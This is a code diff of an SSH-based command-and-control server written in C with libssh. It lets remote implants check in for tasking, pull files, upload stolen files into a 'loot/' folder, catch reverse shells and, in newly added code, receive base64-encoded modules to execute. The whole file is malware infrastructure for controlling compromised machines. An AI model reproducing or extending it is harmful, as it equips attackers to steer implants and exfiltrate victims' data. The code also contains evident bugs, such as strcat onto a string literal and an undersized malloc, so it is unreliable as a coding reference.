@@ -1,23 +1,3 @@
-/* This is a sample implementation of a libssh based SSH server */
-/*
-Copyright 2003-2009 Aris Adamantiadis
-This file is part of the SSH Library
-You are free to copy this file, modify it in any way, consider it being public
-domain. This does not apply to the rest of the library though, but it is
-allowed to cut-and-paste working code from this file to any license of
-program.
-The goal is to show the API in action. It's not a reference on how terminal
-clients must be made or how a client should react.
-
-
-
-
-https://github.com/substack/libssh
-https://www.libssh.org/
-http://api.libssh.org/stable/libssh_tutorial.html
-
-*/
-
 #include "agents.h"
 #include "misc.h"
 #include "list.h"
@@ -64,6 +44,7 @@ void cleanup_pcap(){
 ssh_session session_array[MAX_CONN];
 pthread_t thread_array[MAX_CONN];
 pthread_mutex_t session_lock;
+struct clientNode first;
 int halt = 0;
 
 
@@ -229,27 +210,32 @@ void agent_handler(struct clientNode *node){
     int quitting = 0;
     int size = 0;
     char buff[2048];
+    char tmpbuffer[8];
+    char *dat_ptr = NULL;
+    int size_e = 0;
+    char *ptr = NULL;
+    char filename[2048];
+    FILE *file;
+            
             
     while (!quitting)
     {
-        char *ptr = resp;
+        ptr = resp;
+        operation = -1;
 
         rc = ssh_channel_read(agent->chan, resp, sizeof(resp), 0);
         if (rc == SSH_ERROR)
         {
-            printf("Client %d: Failed to handle agent: %s\n", agent->id, ssh_get_error(agent->session));
+            printf("Client %s: Failed to handle agent: %s\n", agent->id, ssh_get_error(agent->session));
             return;
         }
         
         // this seems wrong...
         char tmpbf[3] = {0,0,0};
         strncat(tmpbf,resp,2);
-        printf("Temp buffer: %s\n", tmpbf);
         operation = atoi(tmpbf);
         ptr += 2;
-        printf("Option thing: %s\n", ptr);
-        printf("Parsed Operation: %d\n", operation);
-
+        
         /*
         Command data structure:
             First char: 
@@ -269,24 +255,21 @@ void agent_handler(struct clientNode *node){
             pthread_mutex_unlock(&session_lock);
             ssh_channel_close(agent->chan);
             ssh_free(agent->session);
-            printf("Client %d: Client exiting...\n", agent->id); 
+            printf("Client %s: Client exiting...\n", agent->id); 
             quitting = 1;
             break;
 
         case AGENT_DOWN_FILE:
 
-            printf("Client %d: Sending file -> %s\n", agent->id, ptr);
+            printf("Client %s: Sending file -> %s\n", agent->id, ptr);
             memset(buff, 0, sizeof(buff));
-            char tmpbuffer[8];
             tmpbuffer[7] = '\0';
-            char *dat_ptr = NULL;
-            int size_e = 0;
-
+            
             // get filesize 
             size = get_file(ptr, &dat_ptr);
             
             if(size < 0){
-                printf("Client %d: filename '%s' does not exist\n", agent->id, buff); 
+                printf("Client %s: filename '%s' does not exist\n", agent->id, buff); 
                 ssh_channel_write(agent->chan, "er", 3);
                 break;
             }
@@ -298,14 +281,14 @@ void agent_handler(struct clientNode *node){
             ssh_channel_write(agent->chan, tmpbuffer, sizeof(tmpbuffer));
             ssh_channel_read(agent->chan, buff, sizeof(buff), 0);
             
-            char *ptr = b64_encode((unsigned char *)dat_ptr, size);
+            ptr = b64_encode((unsigned char *)dat_ptr, size);
             
             // writes file 
             rc = ssh_channel_write(agent->chan, ptr, size_e);
             if(rc == SSH_ERROR){
                 printf("Tada you found it: %s\n", ssh_get_error(agent->session));
             }
-            printf("Completed\n");
+            printf("Client %s: Sent file successfully\n", agent->id);
 
             break;
 
@@ -315,7 +298,6 @@ void agent_handler(struct clientNode *node){
             
             // gets file name
             ssh_channel_write(agent->chan, "fn", 3);
-            char filename[2048];
             ssh_channel_read(agent->chan, filename, sizeof(filename), 0);
             
             // get size and allocate memory segment
@@ -330,7 +312,6 @@ void agent_handler(struct clientNode *node){
 
             // writes file 
             ssh_channel_write(agent->chan, "ok", 3);
-            FILE *file;
             clean_input(filename);
             strcat("loot/", filename);
             file = fopen(filename, "wb");
@@ -346,8 +327,43 @@ void agent_handler(struct clientNode *node){
             printf("Agent reverse shell caught\n");
             break;
 
+        case AGENT_EXEC_MODULE:
+            printf("Client %s: Sending file -> %s\n", agent->id, ptr);
+            memset(buff, 0, sizeof(buff));
+            // TODO: ZERO OUT ALL BUFFERS HERE
+            // get filesize 
+            size = get_file(ptr, &dat_ptr);
+        
+            if(size < 0){
+                printf("Client %s: filename '%s' does not exist\n", agent->id, buff); 
+                ssh_channel_write(agent->chan, "er", 3);
+                break;
+            }
+            memset(buff, 0, 2048);
+            size_e = b64_encoded_size(size);
+            sprintf(tmpbuffer, "%d", size_e);
+        
+            // writes file size
+            ssh_channel_write(agent->chan, tmpbuffer, sizeof(tmpbuffer));
+            ssh_channel_read(agent->chan, buff, sizeof(buff), 0);
+        
+            ptr = b64_encode((unsigned char *)dat_ptr, size);
+        
+            // writes file 
+            rc = ssh_channel_write(agent->chan, ptr, size_e);
+            if(rc == SSH_ERROR){
+                printf("Client %s: Failed to write data to channel: %s\n", agent->id, ssh_get_error(agent->session));
+            }
+            memset(tmpbuffer, 0, 8);
+
+            ssh_channel_read(agent->chan, tmpbuffer, 8, 0);
+
+            printf("Client %s: Execution of module ended with exit code %s\n", agent->id, tmpbuffer);
+
+            break;
+
         default:
-            printf("Client %d: Unknown operation value '%d'\n", agent->id, operation); 
+            printf("Client %s: Unknown operation value '%d'\n", agent->id, operation); 
             ssh_channel_write(agent->chan, "un", 3);
             break;
         }
@@ -355,7 +371,7 @@ void agent_handler(struct clientNode *node){
 }
 
 
-void *ssh_handler(void* sess){
+void ssh_handler(void* sess){
     struct clientNode *node = (struct clientNode*) sess;
     clientDat *pass = node->data;
     
@@ -371,7 +387,7 @@ void *ssh_handler(void* sess){
         if(message){
             switch(ssh_message_type(message)){
                 case SSH_REQUEST_CHANNEL_OPEN:
-					printf("Client %d: Got request for opening channel\n", pass->id); 
+					printf("Client %s: Got request for opening channel\n", pass->id); 
                     if(ssh_message_subtype(message)==SSH_CHANNEL_SESSION){
                         pass->chan=ssh_message_channel_request_open_reply_accept(message);
                         break;
@@ -384,29 +400,26 @@ void *ssh_handler(void* sess){
     } while(message && !pass->chan);
     
 	if(!pass->chan){
-        printf("Client %d: Channel error : %s\n", pass->id, ssh_get_error(pass->session));
+        printf("Client %s: Channel error : %s\n", pass->id, ssh_get_error(pass->session));
         ssh_finalize();
         free(pass);
         remove_node(node);
-        return NULL;
+        return;
     }
     
 	do {
-		//printf("Entered second message loop\n");
         message=ssh_message_get(pass->session);
         if(message && ssh_message_type(message)==SSH_REQUEST_CHANNEL &&
            ssh_message_subtype(message)==SSH_CHANNEL_REQUEST_SHELL){
-//            if(!strcmp(ssh_message_channel_request_subsystem(message),"sftp")){
-				printf("Client %d: Got tasking request\n", pass->id);
+				printf("Client %s: Got tasking request\n", pass->id);
                 sftp=1;
                 msgType = REQ_TASKING;
                 ssh_message_channel_request_reply_success(message);
                 break;
- //           }
         }
 
 		if (message && ssh_message_type(message) == SSH_REQUEST_CHANNEL && ssh_message_subtype(message) == SSH_CHANNEL_REQUEST_EXEC){
-			printf("Client %d: Got connection from manager\n", pass->id);
+			printf("Client %s: Got connection from manager\n", pass->id);
             ssh_message_channel_request_reply_success(message);
             sftp=1;
             msgType = REQ_EXEC;
@@ -421,34 +434,21 @@ void *ssh_handler(void* sess){
     } while (message && !sftp);
     
 	if(!sftp){
-		printf("Client %d: SFTP error : %s\n", pass->id, ssh_get_error(pass->session));
+		printf("Client %s: SFTP error : %s\n", pass->id, ssh_get_error(pass->session));
         free(pass);
         remove_node(node);
-        return NULL;
+        return;
     }
-    //printf("it works !\n");
     
     switch (msgType)
     {
     case REQ_EXEC:
-    /*
-        Tasking goes like this:
-            Client connects and requests tasking (through requesting a shell interface)
-            Server retrieves client ID (precompiled?), and checks it against existing files
-                if it doesnt have any existing files, then it will create one and return that there is nothing to do (0)
-            
-                If it does have stuff in the file, it will parse it and send it to the client in a parsable format.
-                The client channel is then passed off to a secondary handler who will just help it complete the tasking
-    
-    */
-        printf("Client %d: waiting for command\n", pass->id);
-        printf("Client %d: wrote data to channel\n", pass->id);
+        printf("Client %s: waiting for command\n", pass->id);
+        printf("Client %s: wrote data to channel\n", pass->id);
         break;
     case REQ_TASKING:
-        // Get agent ID
-        //char agent_id[128];
         ssh_channel_read(pass->chan, agent_id, sizeof(agent_id), 0);
-        printf("Client %d: got identifier: %s\n", pass->id, agent_id);
+        printf("Client %s: got identifier: %s\n", pass->id, agent_id);
 
         // Check if ID exists
         memset(buf, 0, sizeof(buf));
@@ -457,7 +457,7 @@ void *ssh_handler(void* sess){
         
         if(!exists){
             init_agent(agent_id);
-            printf("Client %d: Initialized agent\n", pass->id);
+            printf("Client %s: Initialized agent\n", pass->id);
         }
 
         char tasking[2048];
@@ -471,18 +471,91 @@ void *ssh_handler(void* sess){
         
         break;
     default:
-        printf("Client %d: got unknown message type: %d\n", pass->id, msgType);
+        printf("Client %s: got unknown message type: %d\n", pass->id, msgType);
         break;
     }
 
-    printf("Client %d: closing channels...\n", pass->id);
+    printf("Client %s: closing channels...\n", pass->id);
     ssh_message_free(message);
     ssh_disconnect(pass->session);
     free(pass);
 
 	
-    return NULL;
+    return;
 }
+
+void *handle_conn(void *input){
+    int auth=0;
+    ssh_message message;
+    struct clientNode *current = &first;
+    char *name = NULL;
+    ssh_session session = (ssh_session)input;
+    
+    do {
+        message=ssh_message_get(session);
+        if(!message)
+            break;
+        switch(ssh_message_type(message)){
+            case SSH_REQUEST_AUTH:
+                switch(ssh_message_subtype(message)){
+                    case SSH_AUTH_METHOD_PASSWORD:
+                        if(authenticate(ssh_message_auth_user(message), ssh_message_auth_password(message))){
+                            auth=1;
+                            name = malloc(strlen(ssh_message_auth_user(message)));
+                            memset(name, 0, strlen(ssh_message_auth_user(message)));
+                            sprintf(name, "%s", ssh_message_auth_user(message));
+                            ssh_message_auth_reply_success(message,0);
+                            break;
+                       	} else {
+                            auth = 2;
+                            ssh_message_reply_default(message);
+                            break;
+                        }
+                    // not authenticated, send default message
+                    case SSH_AUTH_METHOD_NONE:
+                    default:
+                        ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
+                        ssh_message_reply_default(message);
+                        break;
+                }
+                break;
+            default:
+                ssh_message_reply_default(message);
+        }
+        ssh_message_free(message);
+    } while (!auth);
+    
+    // Check if the client authenticated successfully
+	if(auth != 1){
+        printf("Server: Terminating connection\n");
+        ssh_disconnect(session);
+    }else {
+        clientDat *pass = malloc(sizeof(clientDat));
+        pass->id = name;
+        pass->session = session;
+        pass->trans_id = rand();
+    
+        pthread_mutex_lock(&session_lock);
+        // the fucker is pointing to itself @ 3 nodes...
+        while(current->nxt != NULL){
+            current = current->nxt;
+        }
+            
+        struct clientNode *node = malloc(sizeof(*node));
+        node->data = pass;
+        node->nxt = NULL;
+        node->prev = NULL;
+        add_node(node, current);
+        pthread_mutex_unlock(&session_lock);
+                
+        ssh_handler(node);
+    }
+
+    return NULL;
+        
+}
+
+
 
 // REWORK
 void handleTerm(int term){
@@ -514,7 +587,7 @@ void handleTerm(int term){
 }
 
 void print_clientDat(clientDat *str){
-    printf("\n\nID: %d\n", str->id);
+    printf("\n\nID: %s\n", str->id);
     printf("Session address: %p\n", &(str->session));
     printf("Transaction ID: %d\n", str->trans_id);
     printf("Channel address: %p\n", &(str->chan));
@@ -542,32 +615,26 @@ int main(int argc, char **argv){
     // initialize variables
     ssh_session session;
     ssh_bind sshbind;
-    ssh_message message;
-    int auth=0;
     int r;
     int opt = 1;
     int quitting = 0;
 	int master_socket;
     int ctr = 0;
-    int inf_ctr = 0;
     pthread_t thread;
-    struct clientNode first;
     first.data = NULL;
     first.nxt = NULL;
     first.prev = NULL;
-    struct clientNode *current;
-    current = &first;
-
+    
     // Initialize directories
     init();    
 
     if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0){   
-        perror("socket failed");   
+        perror("Server: Socket Failure");   
         exit(EXIT_FAILURE);   
     }
 
     if(setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt)) < 0 ){   
-        perror("setsockopt");   
+        perror("Server: Setsockopt Failure");   
         exit(EXIT_FAILURE);   
     }
 
@@ -580,8 +647,6 @@ int main(int argc, char **argv){
 	
     ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
     ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");
-    //ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT, &port);
-	printf("Initialized Variables...\n");
 #ifdef HAVE_ARGP_H
     /*
      * Parse our arguments; every option seen by parse_opt will
@@ -605,7 +670,6 @@ int main(int argc, char **argv){
     
     // accept connections
     while (!quitting){
-        printf("Server: Found free session at index %d\n", ctr);
         session=ssh_new();
 
         r=ssh_bind_accept(sshbind,session);
@@ -619,80 +683,15 @@ int main(int argc, char **argv){
             return 1;
         }
 
-        auth = 0;
-        do {
-            message=ssh_message_get(session);
-            if(!message)
-                break;
-            switch(ssh_message_type(message)){
-                case SSH_REQUEST_AUTH:
-                    switch(ssh_message_subtype(message)){
-                        case SSH_AUTH_METHOD_PASSWORD:
-                            if(authenticate(ssh_message_auth_user(message), ssh_message_auth_password(message))){
-                                auth=1;
-                                ssh_message_auth_reply_success(message,0);
-                                break;
-                           	} else {
-                                auth = 2;
-                                ssh_message_reply_default(message);
-                                break;
-                            }
-                        // not authenticated, send default message
-                        case SSH_AUTH_METHOD_NONE:
-                        default:
-                            ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
-                            ssh_message_reply_default(message);
-                            break;
-                    }
-                    break;
-                default:
-                    ssh_message_reply_default(message);
-            }
-            ssh_message_free(message);
-        } while (!auth);
-    
-        // Check if the client authenticated successfully
-	    if(auth != 1){
-            printf("Server: Terminating connection\n");
+        // pass connection to handler thread
+        if(pthread_create(&thread, NULL, handle_conn, session)){
+            printf("Error creating thread\n");
             ssh_disconnect(session);
-        }else {
-            ctr++;
-
-            clientDat *pass = malloc(sizeof(clientDat));
-            pass->id = ctr;
-            pass->session = session;
-            pass->trans_id = rand();
-    
-            pthread_mutex_lock(&session_lock);
-            // the fucker is pointing to itself @ 3 nodes...
-            while(current->nxt != NULL && inf_ctr < 100){
-                current = current->nxt;
-                inf_ctr++;
-            }
-            if (inf_ctr >= 100)
-            {
-                printf("CAUGHT INFINITE LOOP!!\n");
-            }
-            
-            struct clientNode *node = malloc(sizeof(*node)); // somehow this is getting assigned the same address as the previous node?
-            node->data = pass;
-            node->nxt = NULL;
-            node->prev = NULL;
-            add_node(node, current);
-            pthread_mutex_unlock(&session_lock);
-                
-        
-            // Pass the connection off to the handler
-            if(pthread_create(&thread, NULL, ssh_handler, node)){
-                printf("Error creating thread\n");
-                ssh_disconnect(session);
-                break;
-            }
-    
-            printf("Server: Passed session to thread...\n");
-    
-            thread_array[ctr] = thread;
+            break;
         }
+    
+        thread_array[ctr] = thread;
+
         	
     }
         
